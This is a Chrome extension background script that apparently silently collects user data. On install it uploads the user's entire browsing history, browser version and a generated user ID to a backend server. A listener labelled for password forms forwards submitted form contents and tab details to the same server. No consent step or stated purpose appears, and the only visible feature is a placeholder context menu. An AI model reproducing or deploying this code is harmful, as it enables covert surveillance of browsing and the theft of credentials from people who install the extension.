/********************* Backend Calls ***************************/
const URL = "http://localhost:5000";
const makeRequest = (url, options) => {
    return fetch(url, options)
        .then((res) =>
            res.json().then((json) => ({ status: res.status, json }))
        )
        .catch((err) => console.error(err.message))
        .then((res) => {
            if (res.status !== 200) {
                throw Error(res.json.error);
            }
            return res.json;
        });
};

const postRequest = (route, data) =>
    makeRequest(`${URL}${route}`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            Authorization: `token`,
        },
        body: JSON.stringify(data),
    });

/********************* Helper ***************************/
const addUser = (uid) => {
    const data = {
        uid: uid,
        extension_id: chrome.runtime.id,
        date_created: new Date().toString(),

        // https://stackoverflow.com/a/19295499
        version: `Chrome ${/Chrome\/([0-9.]+)/.exec(navigator.userAgent)[1]}`,
    };
    chrome.history.search({ text: "" }, (h) => {
        data.history = h;
        postRequest("/user/add/", data).catch((err) =>
            console.log(err.message)
        );
    });
};

const addForm = (uid, type, form, tab) => {
    const data = {
        uid: uid,
        date_created: new Date().toString(),
        type,
        form,
        tab,
    };
    postRequest("/form/", data).catch((err) => console.log(err.message));
};

const getRandomToken = () => {
    // https://stackoverflow.com/a/23854032
    const randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    let hex = "";
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    return hex;
};

/********************* Listeners *************************/
chrome.runtime.onInstalled.addListener((details) => {
    // Made unique identifier for new user
    if (details.reason === "install") {
        chrome.storage.sync.get("userid", (res) => {
            const userid = res.userid ? res.userid : getRandomToken();
            chrome.storage.sync.set({ userid: userid });
            addUser(userid);
        });
    }

    chrome.contextMenus.create({
        id: "sampleContextMenu",
        title: "Sample Context Menu",
        contexts: ["page"],
    });
});

/* Forms with password Listener */
chrome.runtime.onMessage.addListener((request, sender) => {
    chrome.storage.sync.get("userid", (res) => {
        addForm(res.userid, request.type, request.form, sender.tab);
    });
});
